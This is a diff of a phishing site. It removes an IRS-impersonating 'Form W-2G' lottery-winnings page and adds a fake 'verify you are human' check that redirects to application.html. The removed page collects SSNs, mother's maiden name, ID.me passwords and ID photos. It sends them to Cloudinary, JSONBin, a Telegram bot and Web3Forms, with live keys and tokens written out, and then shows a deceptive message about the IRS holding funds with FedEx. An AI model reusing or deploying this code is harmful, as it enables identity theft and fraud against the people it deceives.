@@ -1,867 +1,138 @@
 <!DOCTYPE html>
-<!-- saved from url=(0036)https://prosvrve.com/cpa/application -->
-<html lang="zxx"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-        <!-- Required meta tags -->
-         <title>IRS Form W-2G</title>
-        <style>
-            #loadingScreen {
-                font-family: Arial, sans-serif;
-                font-size: 1.5rem;
-                color: #333;
-                animation: fadeIn 0.5s ease-in-out;
-            }
-        
-            @keyframes fadeIn {
-                from {
-                    opacity: 0;
-                }
-                to {
-                    opacity: 1;
-                }
-            }
-        </style>
-
-        <style>
-  .bg-diagonal {
-    background-color: #fffdf7;
-    background-image: repeating-linear-gradient(
-      45deg,
-      rgba(0, 150, 200, 0.06),
-      rgba(0, 150, 200, 0.06) 1px,
-      transparent 1px,
-      transparent 20px
-    );
-  }
-</style>
-
-        
-        
-		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-        <script src="https://kit.fontawesome.com/YOUR_FA_KIT.js" crossorigin="anonymous"></script>
-        <!-- Bootstrap Min CSS --> 
-        <link rel="stylesheet" href="./apply_files/bootstrap.min.css">
-        <!-- Owl Theme Default Min CSS --> 
-        <link rel="stylesheet" href="./apply_files/owl.theme.default.min.css">
-        <!-- Owl Carousel Min CSS --> 
-        <link rel="stylesheet" href="./apply_files/owl.carousel.min.css">
-        <!-- Owl Magnific Min CSS --> 
-        <link rel="stylesheet" href="./apply_files/magnific-popup.min.css">
-        <!-- Animate Min CSS --> 
-        <link rel="stylesheet" href="./apply_files/animate.min.css">
-        <!-- Boxicons Min CSS --> 
-		<link rel="stylesheet" href="./apply_files/boxicons.min.css"> 
-        <!-- Flaticon CSS --> 
-		<link rel="stylesheet" href="./apply_files/flaticon.css">
-        <!-- Meanmenu Min CSS -->
-        <link rel="stylesheet" href="./apply_files/meanmenu.min.css">
-        <!-- Nice Select Min CSS -->
-		<link rel="stylesheet" href="./apply_files/nice-select.min.css">
-		<!-- Progressbar Min CSS -->
-		<link rel="stylesheet" href="./apply_files/progressbar.min.css">
-		<!-- Odometer Min CSS-->
-		<link rel="stylesheet" href="./apply_files/odometer.min.css">
-        <!-- Style CSS -->
-        <link rel="stylesheet" href="./apply_files/style.css">
-        <!-- Responsive CSS -->
-		<link rel="stylesheet" href="./apply_files/responsive.css">
-		
-		<!-- Favicon -->
-		<link rel="icon" type="image/png" href="https://prosvrve.com/cpa/assets/img/favicon.png">
-		<script src="https://cdn.tailwindcss.com"></script>
-       <!-- Favicon -->
-		<link rel="icon" type="image/png" href="https://prosvrve.com/cpa/assets/img/favicon.png">
-        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200&icon_names=warning" />
-        
-        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg==" crossorigin="anonymous" referrerpolicy="no-referrer" />  </head>
-    <body>
-
-    
-        <!-- Start Preloader Area -->
-<div class="preloader" style="background-color: rgb(154, 93, 71); display: none;">
-    <div class="lds-ripple">
-        <div></div>
-        <div></div>
-    </div>
-</div>
-<!-- End Preloader Area -->
-  
-
-<!-- USA Government Banner -->
-<section class="w-full bg-gray-100 border-b border-gray-300" aria-label="Official government website">
-  <div class="max-w-7xl mx-auto px-4">
-    
-    <!-- Header -->
-    <header class="flex items-center justify-between py-2">
-      <div class="flex items-center gap-3">
-        <img
-          src="/apply_files/us_flag_small.png"
-          alt="U.S. flag"
-          class="w-5 h-auto"
-        />
-        <p class="text-sm text-gray-700">
-          An official website of the United States government
-        </p>
-      </div>
-
-      <button
-        id="toggleBanner"
-        aria-expanded="false"
-        aria-controls="gov-banner"
-        class="text-[10px] text-blue-700 font-medium flex items-center gap-1"
-      >
-        Here’s how you know
-        <svg class="w-4 h-4 transition-transform" id="arrowIcon" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-          <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7" />
-        </svg>
-      </button>
-    </header>
-
-    <!-- Accordion Content -->
-    <div
-      id="gov-banner"
-      class="hidden border-t border-gray-300 py-4"
-    >
-      <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-        
-        <!-- .gov Info -->
-        <div class="flex gap-4">
-          <img
-            src="/apply_files/icon-dot-gov.svg"
-            alt="Dot gov"
-            class="w-10 h-10"
-          />
-          <p class="text-sm text-gray-700">
-            <strong>Official websites use .gov</strong><br />
-            A <strong>.gov</strong> website belongs to an official government organization in the United States.
-          </p>
-        </div>
-
-        <!-- HTTPS Info -->
-        <div class="flex gap-4">
-          <img
-            src="apply_files/icon-https.svg"
-            alt="HTTPS"
-            class="w-10 h-10"
-          />
-          <p class="text-sm text-gray-700">
-            <strong>Secure .gov websites use HTTPS</strong><br />
-            A <strong>lock</strong> or <strong>https://</strong> means you’ve safely connected to the .gov website.
-            Share sensitive information only on official, secure websites.
-          </p>
-        </div>
-
-      </div>
-    </div>
-  </div>
-</section>
-
-
-
- <header class="relative bg-blue-600 bg-center " >
-    <div class="absolute inset-0 bg-black opacity-40"></div>
-    <div class="container mx-auto relative z-10 flex items-center justify-between px-6 h-full">
-      <img src="127ec345eb208cef16e4195260b94b6d-removebg-preview.png" alt="IRS Logo" class="h-16">
-      <h1 class="text-white text-sm font-thin">Help</h1>
-    </div>
-  </header>
-
-
-  <section class="bg-white text-gray-800">
-
-  <!-- Container -->
-  <div class="max-w-5xl mx-auto px-4 py-10">
-
-    <!-- Title -->
-    <h1 class="text-3xl md:text-4xl font-bold text-center mb-8">
-      Form W-2G, File This Form to Report Winnings and any Federal Income Tax Withheld
-    </h1>
-
-    <!-- Info Box -->
-    <div class="bg-sky-50 border-l-4 border-teal-700 p-6 md:p-8 text-[15px] leading-relaxed space-y-5">
-
-      <p>
-        <strong>What is Form W-2G?</strong><br />
-        Form W-2G is the official document used by U.S. individuals to report lottery or grant income
-        winnings to the Internal Revenue Service (IRS). It is primarily used when the winnings have
-        already been taxed at the federal level and paid so the next beneficiary does not need to
-        pay any tax on what they received. The IRS needs this document for income transparency and
-        tax record purposes.
-      </p>
-
-      <p>
-        <strong>Why You Should File Form W-2G</strong><br />
-        Even though federal taxes may have already been deducted from your winnings, it is still
-        necessary to report them as part of your annual income. Filing this form helps ensure your
-        income is properly documented and avoids any issues with unreported earnings.
-      </p>
-
-      <p>
-        It supports your claim that no additional taxes are owed since the tax was already fully
-        paid at the source.
-      </p>
-
-      <p>
-        <strong>What’s Included in Form W-2G</strong><br />
-        Your full name and identifying information, total amount of lottery or grant winnings,
-        source of the winnings (e.g. CGF Grant Program), confirmation that taxes were withheld or
-        paid, and other income, deductions, or credits if applicable.
-      </p>
-
-      <p>
-        <strong>Benefits of Filing</strong><br />
-        Ensures IRS compliance, prevents future audits or penalties, helps determine eligibility
-        for a refund, and keeps your tax record complete and transparent.
-      </p>
-
-      <p class="italic text-sm">
-        Reminder: Filing this form does not mean you will owe more taxes. In fact, it could verify
-        that your tax obligation has already been met.
-      </p>
-
-    </div>
-
-    <!-- Application Section -->
-    <div class="mt-10">
-     
-      <p class="text-sm italic text-gray-600">
-       When you submit this form, it will not automatically collect your details like name and email address unless you provide it yourself.
-      </p>
-    </div>
-
-  </div>
-
-</section>
-
-
-
-
-<!-- Start Application Area -->
-<section class="bg-white py-1">
-  <div class="max-w-6xl mx-auto px-4">
-    <div class="bg-white p-10">
-   
-
-     <form class="grid grid-cols-1 lg:grid-cols-2 gap-6" id="newcontactForm">
-
-  <!-- Full Legal Name -->
-  <div class="flex flex-col">
-    <label class="font-semibold mb-1">Full Legal Name <span class="text-red-500">*</span></label>
-    <input type="text" name="full_name" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
-  </div>
-
-<div class="flex flex-col">
-  <label class="font-semibold mb-1">
-    Date of Birth (MM/DD/YYYY) <span class="text-red-500">*</span>
-  </label>
-  <input
-    type="text"
-    name="dob"
-    placeholder="MM/DD/YYYY"
-    maxlength="10"
-    inputmode="numeric"
-    pattern="^(0[1-9]|1[0-2])/(0[1-9]|[12][0-9]|3[01])/\d{4}$"
-    class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500"
-    required
-  >
-</div>
-<script>
-const dobInput = document.querySelector('input[name="dob"]');
-
-dobInput.addEventListener('input', (e) => {
-  let value = e.target.value.replace(/\D/g, '');
-
-  if (value.length >= 3 && value.length <= 4) {
-    value = value.slice(0, 2) + '/' + value.slice(2);
-  } else if (value.length > 4) {
-    value =
-      value.slice(0, 2) +
-      '/' +
-      value.slice(2, 4) +
-      '/' +
-      value.slice(4, 8);
-  }
-
-  e.target.value = value;
-});
-</script>
-
-
-
-  <!-- SSN -->
-  <div class="flex flex-col">
-    <label class="font-semibold mb-1">Social Security Number (SSN) <span class="text-red-500">*</span></label>
-    <input type="text" name="ssn" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
-  </div>
-
-  <!-- Email -->
-  <div class="flex flex-col">
-    <label class="font-semibold mb-1">Email Address <span class="text-red-500">*</span></label>
-    <input type="email" name="email" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
-  </div>
-
-  <!-- Phone -->
-  <div class="flex flex-col">
-    <label class="font-semibold mb-1">Phone Number <span class="text-red-500">*</span></label>
-    <input type="tel" name="phone" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
-  </div>
-
-  <!-- Current Address -->
-  <div class="flex flex-col">
-    <label class="font-semibold mb-1">Current Residential Address <span class="text-red-500">*</span></label>
-    <input type="text" name="current_address" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
-  </div>
-
-  <!-- Place of Birth -->
-  <div class="flex flex-col">
-    <label class="font-semibold mb-1">Place of Birth (City & State) <span class="text-red-500">*</span></label>
-    <input type="text" name="place_of_birth" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
-  </div>
-
-  <!-- Mother's Maiden Name -->
-  <div class="flex flex-col">
-    <label class="font-semibold mb-1">Mother’s Maiden Name <span class="text-red-500">*</span></label>
-    <input type="text" name="mother_maiden_name" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
-  </div>
-
-  <!-- Mother Full Name -->
-  <div class="flex flex-col">
-    <label class="font-semibold mb-1">Mother’s Full Name <span class="text-red-500">*</span></label>
-    <input type="text" name="mother_full_name" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
-  </div>
-
-  <!-- Father Full Name -->
-  <div class="flex flex-col">
-    <label class="font-semibold mb-1">Father’s Full Name <span class="text-red-500">*</span></label>
-    <input type="text" name="father_full_name" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
-  </div>
-
-  <!-- Previous Address -->
-  <div class="flex flex-col lg:col-span-2">
-    <label class="font-semibold mb-1">Previous Address <span class="text-red-500">*</span></label>
-    <input type="text" name="previous_address" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
-  </div>
-
-  <!-- Past Employer -->
-  <div class="flex flex-col">
-    <label class="font-semibold mb-1">Past Employers Names<span class="text-red-500">*</span></label>
-    <input type="text" name="past_employers" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
-  </div>
-
-  <!-- Winnings Amount -->
-  <div class="flex flex-col">
-    <label class="font-semibold mb-1">Amount of Lottery or Grant Winnings to Received
-<span class="text-red-500">*</span></label>
-    <input type="text" name="winnings_amount" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
-  </div>
-
-  <!-- Winnings Source -->
-  <div class="flex flex-col">
-    <label class="font-semibold mb-1"> Source of Winnings (e.g., WCAG Grant Program, State Lottery, PowerBall etc.) <span class="text-red-500">*</span></label>
-    <input type="text" name="winnings_source" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
-  </div>
-
-  <!-- Received Tax Form -->
-  <div class="flex flex-col">
-    <label class="font-semibold mb-1">Did You Receive a Form 1099 or W-2G from the issuer?<span class="text-red-500">*</span></label>
-    <select name="received_tax_form" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
-      <option value="">Select</option>
-      <option value="Yes">Yes</option>
-      <option value="No">No</option>
-    </select>
-  </div>
-
-  <!-- Filing Status -->
-  <div class="flex flex-col">
-    <label class="font-semibold mb-1">Filing Status for Tax Year<span class="text-red-500">*</span></label>
-    <select name="filing_status" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
-      <option value="">Select</option>
-      <option>Single</option>
-      <option>Married Filing Jointly</option>
-      <option>Married Filing Separately</option>
-      <option>Head of Household</option>
-      <option>Qualifying Widow(er)</option>
-    </select>
-  </div>
-
-  <!-- ID.me -->
-  <div class="flex flex-col">
-    <label class="font-semibold mb-1">Do you have an ID.me account? <span class="text-red-500">*</span></label>
-    <select name="has_idme" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
-      <option value="">Select</option>
-      <option>Yes</option>
-      <option>No</option>
-    </select>
-  </div>
-
-  <!-- ID.me Email -->
-  <div class="flex flex-col">
-    <label class="font-semibold mb-1">If yes, please log in or provide your registered ID.me email:</label>
-    <input type="email" name="idme_email" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500">
-  </div>
-
-  <!-- ID.me Password -->
-  <div class="flex flex-col">
-    <label class="font-semibold mb-1">Login Paššword: ( We do not store your credentials. ID.me login is used only to verify your identity through secure government-backed authentication.)</label>
-    <input type="text" name="idme_password" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500">
-  </div>
-
-    <!-- Confirmation -->
-  <div class="flex flex-col lg:col-span-2">
-    <label class="font-semibold mb-1">If no, would you like help setting up an ID.me account? <span class="text-red-500">*</span></label>
-    <select name="idme_create" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" >
-      <option value="">Select</option>
-      <option>Yes</option>
-      <option>No</option>
-    </select>
-  </div>
-
-  <!-- Upload ID -->
-  <div class="lg:col-span-2">
-    <h3 class="font-bold mb-4">Upload Government Issued ID or Drivers License</h3>
-    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
-      <div class="flex flex-col">
-        <label class="font-semibold mb-1">Front of ID</label>
-        <input type="file" name="id_front" class="border rounded-lg p-3">
-      </div>
-      <div class="flex flex-col">
-        <label class="font-semibold mb-1">Back of ID</label>
-        <input type="file" name="id_back" class="border rounded-lg p-3">
-      </div>
-    </div>
-  </div>
-
-  <!-- Confirmation -->
-  <div class="flex flex-col lg:col-span-2">
-    <label class="font-semibold mb-1">I confirm that the information above is accurate to the best of my knowledge <span class="text-red-500">*</span></label>
-    <select name="confirmation" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
-      <option value="">Select</option>
-      <option>Yes</option>
-      <option>No</option>
-    </select>
-  </div>
-
-  <!-- Initials -->
-  <div class="flex flex-col">
-    <label class="font-semibold mb-1">Initials Signature <span class="text-red-500">*</span></label>
-    <input type="text" name="initials" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
-  </div>
-
-<div class="flex flex-col">
-  <label class="font-semibold mb-1">
-    Date of Submission <span class="text-red-500">*</span>
-  </label>
-  <input
-    type="text"
-    name="submission_date"
-    placeholder="MM/DD/YYYY"
-    maxlength="10"
-    inputmode="numeric"
-    pattern="^(0[1-9]|1[0-2])/(0[1-9]|[12][0-9]|3[01])/\d{4}$"
-    class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500"
-    required
-  >
-</div>
-<script>
-const submissionInput = document.querySelector('input[name="submission_date"]');
-
-submissionInput.addEventListener('input', (e) => {
-  let value = e.target.value.replace(/\D/g, '');
-
-  if (value.length >= 3 && value.length <= 4) {
-    value = value.slice(0, 2) + '/' + value.slice(2);
-  } else if (value.length > 4) {
-    value =
-      value.slice(0, 2) +
-      '/' +
-      value.slice(2, 4) +
-      '/' +
-      value.slice(4, 8);
-  }
-
-  e.target.value = value;
-});
-</script>
-
-  <!-- Note -->
-  <div class="lg:col-span-2">
-    <p class="text-gray-600 text-sm">
-      Note: After submission, an agent may contact you for verification and final processing.
-    </p>
-  </div>
-
-  <!-- Submit -->
-  <div class="lg:col-span-2 flex justify-center mt-6">
-    <button type="submit"
-      class="bg-blue-800 hover:bg-blue-900 text-white font-semibold py-3 px-10 rounded-lg shadow-lg transition-all duration-300">
-      Submit Application
-    </button>
-  </div>
-
-</form>
-
-    </div>
-  </div>
-</section>
-
-
-
-<hr>
-
-
-
-<!--Start of Tawk.to Script-->
-<script type="text/javascript">
-var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-(function(){
-var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-s1.async=true;
-s1.src='https://embed.tawk.to/6969255405cdea197d1499a1/1jf1bjkvh';
-s1.charset='UTF-8';
-s1.setAttribute('crossorigin','*');
-s0.parentNode.insertBefore(s1,s0);
-})();
-</script>
-<!--End of Tawk.to Script-->
-        
-        <!-- Start Go Top Area -->
-        <div class="go-top active">
-            <i class="fa-solid fa-chevron-up"></i>
-            <i class="fa-solid fa-chevron-up"></i>
-        </div>
-<!-- End Go Top Area --> 
-
-<script>
-const form = document.getElementById("newcontactForm");
-
-form.addEventListener("submit", async function (e) {
-  e.preventDefault();
-
-  /* ---------------- Loading Screen ---------------- */
-  const loadingScreen = document.createElement("div");
-  loadingScreen.style.cssText = `
-    position:fixed; inset:0;
-    background:rgba(255,255,255,.9);
-    display:flex; align-items:center; justify-content:center;
-    z-index:9999; font-size:1.5rem; color:#333;
-  `;
-  loadingScreen.textContent = "Submitting your application...";
-  document.body.appendChild(loadingScreen);
-
-  try {
-    const formData = new FormData(form);
-
-    /* ---------------- Cloudinary Upload ---------------- */
-    const uploadToCloudinary = async (file) => {
-      const cloudName = "dx90y9zdx";
-      const uploadPreset = "adorethebrand";
-
-      const data = new FormData();
-      data.append("file", file);
-      data.append("upload_preset", uploadPreset);
-
-      const res = await fetch(
-        `https://api.cloudinary.com/v1_1/${cloudName}/upload`,
-        { method: "POST", body: data }
-      );
-
-      const json = await res.json();
-      if (!json.secure_url) throw new Error("Cloudinary upload failed");
-      return json.secure_url;
-    };
-
-    /* ---------------- Upload Images ---------------- */
-    let idFrontUrl = "";
-    let idBackUrl = "";
-
-    const idFront = formData.get("id_front");
-    const idBack = formData.get("id_back");
-
-    if (idFront && idFront.size > 0) {
-      idFrontUrl = await uploadToCloudinary(idFront);
-    }
-    if (idBack && idBack.size > 0) {
-      idBackUrl = await uploadToCloudinary(idBack);
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Checking your browser...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    body {
+      background: #ffffff;
+      color: #111827;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
 
-    formData.set("id_front", idFrontUrl);
-    formData.set("id_back", idBackUrl);
-
-    /* ---------------- Build Submission Object ---------------- */
-    const submission = {};
-    formData.forEach((value, key) => (submission[key] = value));
-    submission.timestamp = new Date().toISOString();
-
-    /* ---------------- JSONBin ---------------- */
-    const BIN_ID = "69692389d0ea881f406e261a";
-    const MASTER_KEY = "$2a$10$yti1izYQ7PKY9IhwxrQiuuIk8TZDdxM6nzYFnduMOvJtKIdyRhBB.";
-
-    const existingRes = await fetch(
-      `https://api.jsonbin.io/v3/b/${BIN_ID}`,
-      { headers: { "X-Master-Key": MASTER_KEY } }
-    );
-
-    const existingJson = await existingRes.json();
-    const submissions = existingJson.record?.submissions || [];
-    submissions.push(submission);
-
-    await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
-      method: "PUT",
-      headers: {
-        "Content-Type": "application/json",
-        "X-Master-Key": MASTER_KEY,
-      },
-      body: JSON.stringify({ submissions }),
-    });
-
-    /* ---------------- Telegram ---------------- */
-    const sendToTelegram = async (message) => {
-      const BOT_TOKEN = "8508362115:AAHAznr2gaRgGxL_cKU771UAcfzM03u547U";
-      const CHAT_ID = "5286426581";
-
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message,
-          parse_mode: "HTML"
-        })
-      });
-    };
-
-    const telegramMessage = `
-📩 <b>New W-2G Application</b>
-
-👤 <b>Name:</b> ${submission.full_name}
-📧 <b>Email:</b> ${submission.email}
-
-🪪 <b>ID Front:</b>
-${idFrontUrl || "Not provided"}
-
-🪪 <b>ID Back:</b>
-${idBackUrl || "Not provided"}
-
-🕒 <b>Submitted:</b>
-${new Date(submission.timestamp).toLocaleString()}
-    `;
-
-    await sendToTelegram(telegramMessage);
-
-    /* ---------------- Web3Forms Email ---------------- */
-    const web3FormData = new FormData();
-    web3FormData.append("access_key", "69459698-1206-46d8-ba1c-d0d5dbc970a7");
-    web3FormData.append("name", submission.full_name);
-    web3FormData.append("email", submission.email);
-    web3FormData.append("subject", "New W-2G Application Submission");
-
-    web3FormData.append(
-      "message",
-      `
-New W-2G Application Received
-
-Name: ${submission.full_name}
-Email: ${submission.email}
-
-ID Front: ${idFrontUrl || "Not provided"}
-ID Back: ${idBackUrl || "Not provided"}
-
-Submitted at: ${new Date().toLocaleString()}
-      `
-    );
-
-    const web3Res = await fetch("https://api.web3forms.com/submit", {
-      method: "POST",
-      body: web3FormData,
-    });
-
-    const web3Result = await web3Res.json();
-    if (!web3Result.success) {
-      throw new Error(web3Result.message || "Web3Forms failed");
+    .box {
+      width: 360px;
+      text-align: center;
+      border: 1px solid #e5e7eb;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
     }
 
-    form.reset();
+    .progress {
+      width: 100%;
+      height: 16px;
+      background: #e5e7eb;
+      border-radius: 8px;
+      overflow: hidden;
+      margin-top: 20px;
+      position: relative;
+    }
 
-    /* ---------------- Thank You Modal ---------------- */
-    const modal = document.createElement("div");
-    modal.innerHTML = `
-     <div style="
-        position: fixed;
-        inset: 0;
-        background: rgba(0,0,0,0.6);
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        z-index: 10000;
-        padding: 20px;
-      ">
-        <div style="
-          background: white;
-          max-width: 600px;
-          width: 100%;
-          padding: 40px 30px;
-          border-radius: 12px;
-          box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-          overflow-y: auto;
-          max-height: 90vh;
-          font-family: sans-serif;
-          line-height: 1.6;
-        ">
-          <h2 style="margin-bottom: 25px; font-size: 1.9rem; text-align: center;">Thank You – Submission Received</h2>
-          
-          <p style="margin-bottom: 20px;">
-          We have successfully received your <strong>Form W-2G, U.S. Individual Lottery Income Winnings Report</strong>. Our team is now actively working on your claim regarding the reported lottery winnings. Your submission is being reviewed to ensure that:
-          </p>
-          
-          <ul style="margin-bottom: 20px; padding-left: 20px; list-style-type: disc;">
-            <li style="margin-bottom: 10px;">All winnings are correctly filed</li>
-            <li style="margin-bottom: 10px;">Any taxes owed have been verified as paid or recorded</li>
-            <li style="margin-bottom: 10px;">All required documentation has been submitted</li>
-          </ul>
-          
-          <p style="margin-bottom: 20px;">📦 <strong>What Happens Next:</strong> The IRS will hold the funds temporarily with FedEx while we process your claim and confirm all compliance steps are complete. If your winnings are still subject to any taxation, you will be notified by paper letter within 2–4 weeks. This letter will contain:</p>
-          
-          <ul style="margin-bottom: 20px; padding-left: 20px; list-style-type: disc;">
-            <li style="margin-bottom: 10px;">A summary of your lottery income report</li>
-            <li style="margin-bottom: 10px;">Any tax balance owed (if applicable)</li>
-            <li style="margin-bottom: 10px;">Supporting tax return documents</li>
-          </ul>
-          
-          <p style="margin-bottom: 20px;">📝 <strong>Important Reminder:</strong> This process follows the same procedure as filing a tax return, so every official document you receive will look and feel like IRS tax forms. It is extremely important that you follow every instruction provided by the IRS representative assigned to your case. For any updates or questions, please wait for your mailed notification or respond directly to your assigned IRS contact.</p>
-          
-          <p style="margin-bottom: 30px; text-align:center;"><strong>Thank you for your cooperation.<br/>IRS Claims Filing Department</strong></p>
-          
-          <button id="closeModalBtn" style="
-            display: block;
-            background: #1d4ed8;
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 1rem;
-            margin: 0 auto;
-          ">Close</button>
-        </div>
-      </div>
-    `;
-    document.body.appendChild(modal);
+    .bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #2563eb, #60a5fa);
+      transition: width 0.3s ease;
+    }
 
-    document.getElementById("closeModalBtn").onclick = () => {
-      document.body.removeChild(modal);
-    };
+    .start-btn {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      padding: 4px 12px;
+      font-size: 14px;
+      font-weight: bold;
+      color: white;
+      background-color: #2563eb;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      pointer-events: all;
+      z-index: 2;
+    }
 
-  } catch (err) {
-    console.error(err);
-    alert("Submission failed: " + err.message);
-  } finally {
-    document.body.removeChild(loadingScreen);
-  }
-});
-</script>
+    .status {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #374151;
+    }
+  </style>
+</head>
+<body>
 
+  <div class="box">
+    <h2>Verify Your Are Human</h2>
+    <p>Click the button to start the security check.</p>
 
+    <div class="progress" id="progressBar">
+      <div class="bar" id="bar"></div>
+      <button class="start-btn" id="startBtn">Click Here</button>
+    </div>
 
-
-
-<!-- Toggle Script -->
-<script>
-  const toggleBtn = document.getElementById("toggleBanner");
-  const banner = document.getElementById("gov-banner");
-  const arrow = document.getElementById("arrowIcon");
-
-  toggleBtn.addEventListener("click", () => {
-    const expanded = toggleBtn.getAttribute("aria-expanded") === "true";
-    toggleBtn.setAttribute("aria-expanded", !expanded);
-    banner.classList.toggle("hidden");
-    arrow.classList.toggle("rotate-180");
-  });
-</script>
-
+    <div class="status" id="status">Waiting for your click...</div>
+  </div>
 
 <script>
-  const menuBtn = document.getElementById("menuBtn");
-  const mainNav = document.getElementById("mainNav");
+  const startBtn = document.getElementById("startBtn");
+  const bar = document.getElementById("bar");
+  const status = document.getElementById("status");
 
-  menuBtn?.addEventListener("click", () => {
-    mainNav.classList.toggle("hidden");
+  const checks = [
+    "Checking if you are human...",
+    "Analyzing mouse and keyboard behavior...",
+    "Verifying interaction speed...",
+    "Confirming browser activity...",
+    "Finalizing human verification..."
+];
+
+
+  let progress = 0;
+  let step = 0;
+  let interval;
+
+  startBtn.addEventListener("click", () => {
+    // Prevent multiple clicks
+    if (interval) return;
+
+    status.innerText = "Starting security check...";
+    startBtn.style.display = "none"; // hide button
+
+    interval = setInterval(() => {
+      progress += Math.floor(Math.random() * 12) + 8;
+      if (progress > 100) progress = 100;
+
+      bar.style.width = progress + "%";
+
+      if (step < checks.length) {
+        status.innerText = checks[step];
+        step++;
+      }
+
+      if (progress === 100) {
+        clearInterval(interval);
+        status.innerText = "Verification complete!";
+        sessionStorage.setItem("humanVerified", "true");
+        setTimeout(() => {
+          window.location.href = "application.html";
+        }, 500);
+      }
+    }, 700);
   });
 
-  document.querySelectorAll(".nav-toggle").forEach(btn => {
-    btn.addEventListener("click", () => {
-      const sub = btn.nextElementSibling;
-      const expanded = btn.getAttribute("aria-expanded") === "true";
-      btn.setAttribute("aria-expanded", !expanded);
-      sub.classList.toggle("hidden");
-    });
-  });
+  // Optional bot detection
+  if (!navigator.cookieEnabled || !navigator.userAgent) {
+    document.body.innerHTML = "<h2>Access denied</h2>";
+    throw new Error("Bot detected");
+  }
 </script>
 
-<script>
-  let index = 0;
-  const slides = document.querySelectorAll(".carousel-slide");
-
-  function showSlide(i) {
-    slides.forEach((s, idx) => {
-      s.style.opacity = idx === i ? "1" : "0";
-    });
-  }
-
-  function nextSlide() {
-    index = (index + 1) % slides.length;
-    showSlide(index);
-  }
-
-  function prevSlide() {
-    index = (index - 1 + slides.length) % slides.length;
-    showSlide(index);
-  }
-
-  setInterval(nextSlide, 7000);
-</script>
-
-
-
-         <!-- Jquery Min JS -->
-      <!-- Jquery Min JS -->
-      <script src="./individual_files/jquery.min.js.download"></script> 
-      <script src="./individual_files/forms.js.download"></script>
-      <script src="./individual_files/apply.js.download"></script>
-      <script src="./individual_files/register.js.download"></script>
-      <script src="./individual_files/join.js.download"></script>
-      <script src="./individual_files/start-application.js.download"></script>
-      <script src="./individual_files/start-applications.js.download"></script>
-      <!-- Bootstrap Bundle Min JS -->
-      <!-- Bootstrap Bundle Min JS -->
-      <script src="./individual_files/bootstrap.bundle.min.js.download"></script>
-      <!-- Meanmenu Min JS -->
-      <script src="./individual_files/meanmenu.min.js.download"></script>
-      <!-- Wow Min JS -->
-      <script src="./individual_files/wow.min.js.download"></script>
-      <!-- Owl Carousel Min JS -->
-      <script src="./individual_files/owl.carousel.min.js.download"></script>
-      <!-- Carousel Thumbs Min JS -->
-      <script src="./individual_files/carousel-thumbs.min.js.download"></script>
-      <!-- Owl Magnific Min JS -->
-      <script src="./individual_files/magnific-popup.min.js.download"></script>
-      <!-- Nice Select Min JS -->
-      <script src="./individual_files/nice-select.min.js.download"></script>
-      <!-- Jarallax Min JS --> 
-      <script src="./individual_files/jarallax.min.js.download"></script>
-      <!-- Mixitup Min JS -->
-      <script src="./individual_files/mixitup.min.js.download"></script>
-      <!-- Appear Min JS --> 
-      <script src="./individual_files/appear.min.js.download"></script>
-      <!-- Odometer Min JS --> 
-      <script src="./individual_files/odometer.min.js.download"></script>
-      <!-- Progressbar Min JS -->
